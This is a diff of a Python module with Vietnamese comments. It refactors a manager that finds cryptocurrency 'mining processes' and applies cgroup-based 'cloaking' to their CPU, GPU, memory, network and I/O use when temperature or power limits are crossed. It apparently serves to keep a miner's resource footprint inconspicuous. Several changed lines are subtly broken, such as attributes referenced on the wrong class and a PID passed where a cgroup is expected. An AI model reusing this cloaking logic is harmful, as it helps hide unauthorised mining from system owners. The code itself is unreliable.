@@ -5,11 +5,11 @@ import logging
 import psutil
 import pynvml
 import traceback
-from time import sleep
+from time import sleep, time
 from typing import List, Any, Dict, Optional, Tuple
 from queue import PriorityQueue, Empty, Queue
 from threading import Event, Lock
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from itertools import count
 from contextlib import contextmanager
 
@@ -73,7 +73,7 @@ def acquire_lock_with_timeout(lock: rwlock.RWLockFair, lock_type: str, timeout: 
 class SharedResourceManager:
     """
     Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
-    Tích hợp chặt chẽ với CgroupManager để quản lý cgroup v2.
+    Tích hợp chặt chẽ với ResourceControlFactory để quản lý các resource managers.
     """
     def __init__(self, config: Dict[str, Any], logger: logging.Logger, cgroup_manager: CgroupManager):
         """
@@ -91,6 +91,9 @@ class SharedResourceManager:
         self.gpu_manager = GPUManager()
         self.power_manager = PowerManager()
         self.strategy_cache = {}  # Thêm cache cho chiến lược
+
+        # Khởi tạo các resource managers thông qua ResourceControlFactory
+        self.resource_managers = ResourceControlFactory.create_resource_managers(self.logger)
 
     def is_gpu_initialized(self) -> bool:
         """
@@ -135,6 +138,45 @@ class SharedResourceManager:
             self.logger.error(f"Lỗi get_process_cache_usage cho PID={pid}: {e}\n{traceback.format_exc()}")
             return 0.0
 
+    def get_gpu_usage_percent(self, pid: int) -> float:
+        """
+        Lấy tỉ lệ sử dụng GPU của tiến trình dựa trên PID.
+
+        Args:
+            pid (int): PID của tiến trình.
+
+        Returns:
+            float: Tỉ lệ sử dụng GPU (0.0 - 100.0).
+        """
+        try:
+            pynvml.nvmlInit()
+            device_count = pynvml.nvmlDeviceGetCount()
+            total_gpu_usage = 0.0
+            gpu_present = False
+
+            for i in range(device_count):
+                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
+                # Lấy thông tin tiến trình đang sử dụng GPU
+                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
+                for proc in procs:
+                    if proc.pid == pid:
+                        gpu_present = True
+                        # Lấy tỉ lệ sử dụng GPU
+                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
+                        total_gpu_usage += utilization.gpu  # Tỉ lệ sử dụng GPU
+            pynvml.nvmlShutdown()
+
+            if gpu_present:
+                return total_gpu_usage  # Nếu tiến trình đang sử dụng GPU
+            else:
+                return 0.0  # Không sử dụng GPU
+        except pynvml.NVMLError as e:
+            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
+            return 0.0
+        except Exception as e:
+            self.logger.error(f"Lỗi không xác định trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
+            return 0.0
+
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess, cgroups: Dict[str, str]):
         """
         Áp dụng một chiến lược cloaking cho tiến trình đã cho.
@@ -166,7 +208,7 @@ class SharedResourceManager:
                 self.config,
                 self.logger,
                 self.cgroup_manager,
-                self.get_resource_managers()
+                self.resource_managers
             )
 
             if not strategy:
@@ -186,7 +228,7 @@ class SharedResourceManager:
             self.logger.error(f"Không đủ quyền để áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
         except Exception as e:
             self.logger.error(
-                f"Lỗi không xác định khi áp dụng cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
+                f"Lỗi không xác định khi áp dụng cloaking '{strategy_name}' cho {name} (PID: {pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
@@ -202,52 +244,42 @@ class SharedResourceManager:
         try:
             pid = process.pid
             if strategy_name == 'cpu':
-                current_quota = self.cgroup_manager.get_cgroup_parameter(
-                    cgroups['cpu'], 'cpu.max'
-                )
+                current_quota = self.resource_managers['cpu'].get_cpu_quota(cgroups['cpu'])
                 self.original_resource_limits[pid]['cpu_cloak'] = {
                     'cgroup': cgroups['cpu'],
                     'cpu_max': current_quota
                 }
 
             elif strategy_name == 'gpu':
-                current_gpu_params = self.cgroup_manager.get_gpu_parameters(cgroups['gpu'])
+                current_gpu_params = self.resource_managers['gpu'].get_gpu_parameters(cgroups['gpu'])
                 self.original_resource_limits[pid]['gpu_cloak'] = {
                     'cgroup': cgroups['gpu'],
                     'gpu_params': current_gpu_params
                 }
 
             elif strategy_name == 'memory':
-                current_ram = self.cgroup_manager.get_cgroup_parameter(
-                    cgroups['memory'], 'memory.max'
-                )
+                current_ram = self.resource_managers['memory'].get_memory_limit(cgroups['memory'])
                 self.original_resource_limits[pid]['memory_cloak'] = {
                     'cgroup': cgroups['memory'],
                     'memory_limit': current_ram
                 }
 
             elif strategy_name == 'cache':
-                current_cache = self.cgroup_manager.get_cgroup_parameter(
-                    cgroups['cache'], 'cache.max'
-                )
+                current_cache = self.resource_managers['cache'].get_cache_limit(cgroups['cache'])
                 self.original_resource_limits[pid]['cache_cloak'] = {
                     'cgroup': cgroups['cache'],
                     'cache_limit': current_cache
                 }
 
             elif strategy_name == 'network':
-                current_network = self.cgroup_manager.get_cgroup_parameter(
-                    cgroups['network'], 'network.bandwidth'
-                )
+                current_network = self.resource_managers['network'].get_network_bandwidth(cgroups['network'])
                 self.original_resource_limits[pid]['network_cloak'] = {
                     'cgroup': cgroups['network'],
                     'network_bandwidth': current_network
                 }
 
             elif strategy_name == 'io':
-                current_io = self.cgroup_manager.get_cgroup_parameter(
-                    cgroups['io'], 'io.weight'
-                )
+                current_io = self.resource_managers['io'].get_io_weight(cgroups['io'])
                 self.original_resource_limits[pid]['io_cloak'] = {
                     'cgroup': cgroups['io'],
                     'io_weight': current_io
@@ -282,7 +314,7 @@ class SharedResourceManager:
                         self.config,
                         self.logger,
                         self.cgroup_manager,
-                        self.get_resource_managers()
+                        self.resource_managers
                     )
                     if strategy and callable(getattr(strategy, 'restore', None)):
                         self.logger.info(f"Khôi phục chiến lược '{strategy_name}' cho {name} (PID: {pid})")
@@ -304,17 +336,6 @@ class SharedResourceManager:
                 f"Lỗi khi khôi phục cloaking cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
-
-    def get_resource_managers(self) -> Dict[str, Any]:
-        """
-        Tạo và trả về các Resource Manager cần thiết từ resource_control.py.
-
-        Returns:
-            Dict[str, Any]: Dictionary chứa các Resource Manager.
-        """
-        # Giả sử ResourceControlFactory có phương thức tạo các resource manager dựa trên tên
-        resource_managers = ResourceControlFactory.create_all_managers(self.config, self.logger)
-        return resource_managers
 
 class ResourceManager(BaseManager):
     """
@@ -355,11 +376,11 @@ class ResourceManager(BaseManager):
         # Khởi tạo CgroupManager
         self.cgroup_manager = CgroupManager(logger)
 
-        # Khởi tạo SharedResourceManager
+        # Khởi tạo SharedResourceManager với resource_managers mới
         self.shared_resource_manager = SharedResourceManager(config, logger, self.cgroup_manager)
 
         # Sử dụng ThreadPoolExecutor để quản lý các thread
-        self.executor = ThreadPoolExecutor(max_workers=5)
+        self.executor = ThreadPoolExecutor(max_workers=10)  # Tăng số worker để xử lý cả cloaking và restoration
         self.initialize_tasks()
 
     def initialize_tasks(self):
@@ -386,7 +407,15 @@ class ResourceManager(BaseManager):
         self.stop_event.set()
         self.executor.shutdown(wait=True)
         self.shared_resource_manager.shutdown_nvml()
-        self.cgroup_manager.delete_cgroup('priority_cpu')  # Xóa cgroup priority_cpu nếu tồn tại
+        # Xóa các cgroup đã tạo nếu cần
+        for proc in self.mining_processes:
+            for controller in ['cpu', 'gpu', 'cache', 'network', 'io']:
+                cgroup_name = f"{controller}_cloak_{proc.pid}"
+                try:
+                    self.resource_managers[controller].delete_cgroup(cgroup_name)
+                    self.logger.info(f"Xóa cgroup '{cgroup_name}' cho PID={proc.pid}.")
+                except Exception as e:
+                    self.logger.error(f"Lỗi khi xóa cgroup '{cgroup_name}' cho PID={proc.pid}: {e}")
         self.logger.info("ResourceManager đã dừng.")
         shutdown_power_management()  # Gọi hàm shutdown_power_management trực tiếp
 
@@ -550,10 +579,7 @@ class ResourceManager(BaseManager):
                 # 1) Cập nhật danh sách mining_processes
                 self.discover_mining_processes()
 
-                # 2) Phân bổ tài nguyên theo thứ tự ưu tiên
-                self.allocate_resources_with_priority()
-
-                # 3) Kiểm tra nhiệt độ CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
+                # 2) Kiểm tra nhiệt độ CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                 temp_lims = self.config.get("temperature_limits", {})
                 cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
                 gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)
@@ -561,7 +587,7 @@ class ResourceManager(BaseManager):
                 for proc in self.mining_processes:
                     self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)
 
-                # 4) Kiểm tra công suất CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
+                # 3) Kiểm tra công suất CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                 power_limits = self.config.get("power_limits", {})
                 per_dev_power = power_limits.get("per_device_power_watts", {})
 
@@ -578,7 +604,7 @@ class ResourceManager(BaseManager):
                 for proc in self.mining_processes:
                     self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr)
 
-                # 5) Thu thập metrics (nếu vẫn cần để giám sát)
+                # 4) Thu thập metrics (nếu vẫn cần để giám sát)
                 metrics_data = self.collect_all_metrics()
 
                 # Loại bỏ các phần liên quan đến OpenAI
@@ -586,7 +612,7 @@ class ResourceManager(BaseManager):
             except Exception as e:
                 self.logger.error(f"Lỗi monitor_and_adjust: {e}\n{traceback.format_exc()}")
 
-            # 6) Nghỉ theo chu kỳ lớn nhất (mặc định 60 giây)
+            # 5) Nghỉ theo chu kỳ lớn nhất (mặc định 60 giây)
             sleep(max(temp_intv, power_intv))
 
     def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
@@ -720,7 +746,7 @@ class ResourceManager(BaseManager):
                                 self.config,
                                 self.logger,
                                 self.cgroup_manager,
-                                self.shared_resource_manager.get_resource_managers()
+                                self.shared_resource_manager.resource_managers
                             )
                             self.shared_resource_manager.strategy_cache[strategy] = strategy_instance
                         else:
@@ -739,150 +765,6 @@ class ResourceManager(BaseManager):
             except Exception as e:
                 self.logger.error(f"Lỗi trong process_resource_adjustments: {e}\n{traceback.format_exc()}")
 
-    def allocate_resources_with_priority(self):
-        """
-        Phân bổ tài nguyên cho các tiến trình khai thác theo thứ tự ưu tiên sử dụng cgroups v2.
-        """
-        try:
-            # Sử dụng context manager để chiếm write lock với timeout
-            with acquire_lock_with_timeout(self.resource_lock, 'write', timeout=5) as write_lock:
-                if write_lock is None:
-                    self.logger.error("Failed to acquire resource_lock trong allocate_resources_with_priority.")
-                    return
-
-                # Sử dụng context manager để chiếm read lock với timeout
-                with acquire_lock_with_timeout(self.mining_processes_lock, 'read', timeout=5) as read_lock:
-                    if read_lock is None:
-                        self.logger.error("Failed to acquire mining_processes_lock trong allocate_resources_with_priority.")
-                        return
-
-                    # Sắp xếp các tiến trình theo độ ưu tiên giảm dần
-                    sorted_procs = sorted(
-                        self.mining_processes,
-                        key=lambda x: x.priority,
-                        reverse=True
-                    )
-
-                    total_cores = psutil.cpu_count(logical=True)
-                    allocated = 0
-
-                    for proc in sorted_procs:
-                        if allocated >= total_cores:
-                            self.logger.warning(
-                                f"Không còn CPU core cho {proc.name} (PID: {proc.pid})."
-                            )
-                            continue
-
-                        # Giới hạn CPU sử dụng bằng cgroup v2
-                        cpu_limit_ratio = min(proc.priority, total_cores - allocated) / total_cores
-                        quota = int(cpu_limit_ratio * 100000)  # CPU quota in microseconds per period
-                        self.logger.debug(f"Setting CPU limit for PID={proc.pid}: {cpu_limit_ratio*100:.2f}% ({quota}us)")
-
-                        # Sử dụng CgroupManager để tạo và thiết lập cgroup CPU
-                        cpu_cgroup = f"cpu_cloak_{proc.pid}"
-                        try:
-                            self.cgroup_manager.create_cgroup(cpu_cgroup)
-                            self.cgroup_manager.add_cgroup_to_parent("root", cpu_cgroup)
-                            self.cgroup_manager.set_cpu_quota(
-                                cpu_cgroup, quota=quota, period=100000
-                            )
-                            self.cgroup_manager.assign_process_to_cgroup(proc.pid, cpu_cgroup)
-                            self.logger.debug(f"Gán PID={proc.pid} vào cgroup '{cpu_cgroup}'.")
-                        except Exception as e:
-                            self.logger.error(f"Lỗi khi phân bổ CPU cho PID={proc.pid}: {e}")
-                            continue
-
-                        # Enqueue cloaking strategy
-                        try:
-                            self.enqueue_cloaking(proc)
-                            self.logger.info(f"Enqueued cloaking strategy cho PID={proc.pid}.")
-                        except Exception as e:
-                            self.logger.error(f"Lỗi khi enqueue cloaking cho PID={proc.pid}: {e}")
-                            continue
-
-                        allocated += proc.priority
-
-                        # Phân bổ GPU nếu cần
-                        if self.shared_resource_manager.is_gpu_initialized():
-                            gpu_cgroup = f"gpu_cloak_{proc.pid}"
-                            try:
-                                self.cgroup_manager.create_cgroup(gpu_cgroup)
-                                self.cgroup_manager.add_cgroup_to_parent("root_gpu", gpu_cgroup)
-                                # Thiết lập các thông số GPU nếu cần
-                                desired_gpu_params = self.config.get('gpu_parameters', {})
-                                self.cgroup_manager.set_gpu_parameters(gpu_cgroup, desired_gpu_params)
-                                self.cgroup_manager.assign_process_to_cgroup(proc.pid, gpu_cgroup)
-                                self.logger.debug(f"Gán PID={proc.pid} vào cgroup '{gpu_cgroup}' cho GPU.")
-
-                                # Enqueue cloaking strategy for GPU
-                                gpu_task = {
-                                    'type': 'cloaking',
-                                    'process': proc,
-                                    'strategies': ['gpu']
-                                }
-                                priority_g = 1  # High priority for GPU cloaking
-                                count_val = next(self._counter)
-                                self.resource_adjustment_queue.put((priority_g, count_val, gpu_task))
-                                self.logger.info(f"Enqueued GPU cloaking cho PID={proc.pid}.")
-                            except Exception as e:
-                                self.logger.error(f"Lỗi khi phân bổ GPU cho PID={proc.pid}: {e}")
-                                continue
-
-                        # Phân bổ Cache nếu cần
-                        cache_cgroup = f"cache_cloak_{proc.pid}"
-                        try:
-                            self.cgroup_manager.create_cgroup(cache_cgroup)
-                            self.cgroup_manager.add_cgroup_to_parent("root_cache", cache_cgroup)
-                            # Thiết lập các thông số Cache nếu cần
-                            desired_cache_params = self.config.get('cache_parameters', {})
-                            self.cgroup_manager.set_cache_parameters(cache_cgroup, desired_cache_params)
-                            self.cgroup_manager.assign_process_to_cgroup(proc.pid, cache_cgroup)
-                            self.logger.debug(f"Gán PID={proc.pid} vào cgroup '{cache_cgroup}' cho Cache.")
-
-                            # Enqueue cloaking strategy for Cache
-                            cache_task = {
-                                'type': 'cloaking',
-                                'process': proc,
-                                'strategies': ['cache']
-                            }
-                            priority_c = 1  # High priority for Cache cloaking
-                            count_val = next(self._counter)
-                            self.resource_adjustment_queue.put((priority_c, count_val, cache_task))
-                            self.logger.info(f"Enqueued Cache cloaking cho PID={proc.pid}.")
-                        except Exception as e:
-                            self.logger.error(f"Lỗi khi phân bổ Cache cho PID={proc.pid}: {e}")
-                            continue
-
-                        # Phân bổ Network nếu cần
-                        network_cgroup = f"network_cloak_{proc.pid}"
-                        try:
-                            self.cgroup_manager.create_cgroup(network_cgroup)
-                            self.cgroup_manager.add_cgroup_to_parent("root_network", network_cgroup)
-                            # Thiết lập các thông số Network nếu cần
-                            desired_network_params = self.config.get('network_parameters', {})
-                            self.cgroup_manager.set_network_parameters(network_cgroup, desired_network_params)
-                            self.cgroup_manager.assign_process_to_cgroup(proc.pid, network_cgroup)
-                            self.logger.debug(f"Gán PID={proc.pid} vào cgroup '{network_cgroup}' cho Network.")
-
-                            # Enqueue cloaking strategy for Network
-                            network_task = {
-                                'type': 'cloaking',
-                                'process': proc,
-                                'strategies': ['network']
-                            }
-                            priority_n = 1  # High priority for Network cloaking
-                            count_val = next(self._counter)
-                            self.resource_adjustment_queue.put((priority_n, count_val, network_task))
-                            self.logger.info(f"Enqueued Network cloaking cho PID={proc.pid}.")
-                        except Exception as e:
-                            self.logger.error(f"Lỗi khi phân bổ Network cho PID={proc.pid}: {e}")
-                            continue
-
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi allocate_resources_with_priority: {e}\n{traceback.format_exc()}"
-            )
-
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
         """
         Thu thập các metrics cho một tiến trình cụ thể.
@@ -897,7 +779,13 @@ class ResourceManager(BaseManager):
             p_obj = psutil.Process(process.pid)
             cpu_pct = p_obj.cpu_percent(interval=1)
             mem_mb = p_obj.memory_info().rss / (1024**2)
-            gpu_pct = temperature_monitor.get_gpu_temperature(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0.0
+            
+            # Thu thập tỉ lệ sử dụng GPU đúng cách
+            if self.shared_resource_manager.is_gpu_initialized():
+                gpu_pct = self.shared_resource_manager.get_gpu_usage_percent(process.pid)
+            else:
+                gpu_pct = 0.0
+            
             disk_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)
             net_bw = float(self.config.get('resource_allocation', {})
                                     .get('network', {})
@@ -907,10 +795,7 @@ class ResourceManager(BaseManager):
             cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) 
 
             # Lấy metrics memory nếu cần
-            memory_limit_mb = self.cgroup_manager.get_cgroup_parameter(
-                self.config.get('cgroups', {}).get('memory', ''),
-                'memory.max'
-            ) / (1024**2) if self.config.get('cgroups', {}).get('memory', '') else 0.0
+            memory_limit_mb = self.resource_managers['memory'].get_memory_limit(process.pid) / (1024**2) if self.resource_managers.get('memory') else 0.0
 
             metrics = {
                 'cpu_usage_percent': float(cpu_pct),
@@ -985,7 +870,13 @@ class ResourceManager(BaseManager):
         self.executor.shutdown(wait=True)
         self.shared_resource_manager.shutdown_nvml()  # Sử dụng GPUManager để shutdown NVML
         # Xóa các cgroup đã tạo nếu cần
-        self.cgroup_manager.delete_cgroup('priority_cpu')
+        for proc in self.mining_processes:
+            for controller in ['cpu', 'gpu', 'cache', 'network', 'io']:
+                cgroup_name = f"{controller}_cloak_{proc.pid}"
+                try:
+                    self.resource_managers[controller].delete_cgroup(cgroup_name)
+                    self.logger.info(f"Xóa cgroup '{cgroup_name}' cho PID={proc.pid}.")
+                except Exception as e:
+                    self.logger.error(f"Lỗi khi xóa cgroup '{cgroup_name}' cho PID={proc.pid}: {e}")
         self.logger.info("ResourceManager đã dừng.")
         shutdown_power_management()  # Gọi hàm shutdown_power_management trực tiếp
-
